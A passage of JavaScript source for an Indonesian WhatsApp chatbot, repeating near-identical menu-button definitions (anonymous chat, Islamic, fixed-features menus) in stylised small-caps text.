            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
//=========================================\\
//=========================================\\
case 'anonymousmenubutton': {
let teks =`┏『 *\`乂 ᴀɴᴏɴʏᴍᴏᴜs-ᴍᴇɴᴜ 乂\`* 』━◧
║◦ *${prefix}anonymouschat*
║◦ *${prefix}start*
║◦ *${prefix}next*
║◦ *${prefix}stop*
║◦ *${prefix}sendprofile*
║◦ *${prefix}menfess*
║◦ *${prefix}confess*
║◦ *${prefix}balasmenfess*
║◦ *${prefix}tolakmenfess*
║◦ *${prefix}stopmenfess*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
//=========================================\\
case 'islamimenubutton': {
let teks = `┏『 *\`乂 ɪ s ʟ ᴀ ᴍ ɪ - ᴍᴇɴᴜ 乂\`* 』━◧
║◦ *${prefix}kisahnabi*
║◦ *${prefix}asmaulhusna*
║◦ *${prefix}bacaansholat*
║◦ *${prefix}audiosurah*
║◦ *${prefix}ayatkursi*
║◦ *${prefix}doaharian*
║◦ *${prefix}niatsholat*
║◦ *${prefix}sholat*
║◦ *${prefix}quotesislami*
║◦ *${prefix}doatahlil*
║◦ *${prefix}tafsir*
║◦ *${prefix}jadwalsholat*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'fixbutton': {
let teks = `┏『 *\`乂 ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx - ᴍᴇɴᴜ 乂\`* 』━◧
║◦ *${prefix}nulis*
║◦ *${prefix}sertifikatmenu*
║◦ *${prefix}jadianime*
║◦ *${prefix}ytplay*
║◦ *${prefix}removebg*
║◦ *${prefix}terabox*
║◦ *${prefix}hdvid*
║◦ *${prefix}ytmp3*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `caibutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
